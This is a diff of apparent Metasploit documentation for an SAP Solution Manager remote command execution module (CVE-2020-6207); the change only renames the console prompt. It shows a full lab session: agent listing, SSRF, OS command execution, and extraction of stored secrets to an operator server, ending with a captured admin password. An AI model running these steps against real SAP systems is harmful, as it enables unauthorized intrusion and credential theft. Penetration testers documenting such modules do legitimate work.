@@ -97,15 +97,15 @@ Example: `ping -c 4 1.1.1.1`
 ### Vulnerable SolMan 7.2 running on agent: test_linux with OS: Linux and java version: 1.8
 
 ```
-msf6 > workspace -a SAP_TEST
+msf > workspace -a SAP_TEST
 [*] Added workspace: SAP_TEST
 [*] Workspace: SAP_TEST
-msf6 > use auxiliary/admin/sap/cve_2020_6207_solman_rce
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION LIST
+msf > use auxiliary/admin/sap/cve_2020_6207_solman_rce
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION LIST
 ACTION => LIST
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
 RHOST => 172.16.30.46
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
 [*] Getting a list of agents connected to the Solution Manager: 172.16.30.46
@@ -119,15 +119,15 @@ Connected Agents List
  test_linux    saperp7.corp.test.com  SMDA98         Linux                   1.8.0_25
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
 ACTION => SSRF
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
 AGENT => test_linux
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_METHOD PUT
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_METHOD PUT
 SSRF_METHOD => PUT
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.3:7777/
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.3:7777/
 SSRF_URI => http://192.168.50.3:7777/
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
 [*] Enable EEM on agent: test_linux
@@ -136,13 +136,13 @@ msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Delete script: IqsDdgpc5Iwu on agent: test_linux
 [+] Send SSRF: 'PUT http://192.168.50.3:7777/ HTTP/1.1' from agent: test_linux
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION EXEC
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION EXEC
 ACTION => EXEC
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
 AGENT => test_linux
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.3
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.3
 COMMAND => ping -c 4 192.168.50.3
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
 [*] Enable EEM on agent: test_linux
@@ -151,13 +151,13 @@ msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Delete script: Lu5BnHgzVehn on agent: test_linux
 [+] Execution command: 'ping -c 4 192.168.50.3' on agent: test_linux
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SECSTORE
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SECSTORE
 ACTION => SECSTORE
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
 AGENT => test_linux
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SRVHOST 192.168.50.3
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SRVHOST 192.168.50.3
 SRVHOST => 192.168.50.3
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
 [*] Enable EEM on agent: test_linux
@@ -172,7 +172,7 @@ msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Delete script: ginMlA2izrNi on agent: test_linux
 [*] Server stopped.
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > creds
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > creds
 Credentials
 ===========
 
@@ -180,7 +180,7 @@ host          origin        service           public      private    realm  priv
 ----          ------        -------           ------      -------    -----  ------------  ----------
 172.16.30.46  172.16.30.46  50000/tcp (soap)  j2ee_admin  asdQWE123         Password
 
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > services
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > services
 Services
 ========
 
@@ -188,7 +188,7 @@ host          port   proto  name  state  info
 ----          ----   -----  ----  -----  ----
 172.16.30.46  50000  tcp    soap  open   SAP Solution Manager
 
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > vulns
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > vulns
 
 Vulnerabilities
 ===============
@@ -198,7 +198,7 @@ Timestamp                Host          Name                                     
 2021-03-27 17:49:37 UTC  172.16.30.46  SAP Solution Manager remote unauthorized OS commands execution                                     CVE-2020-6207,URL-https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf,URL-https://github.com/chipik/SAP_EEM_CVE-2020-6207
 2021-03-27 17:49:41 UTC  172.16.30.14  Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server  CVE-2019-0307,URL-https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf
 
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > loot
+msf auxiliary(admin/sap/cve_2020_6207_solman_rce) > loot
 
 Loot
 ====
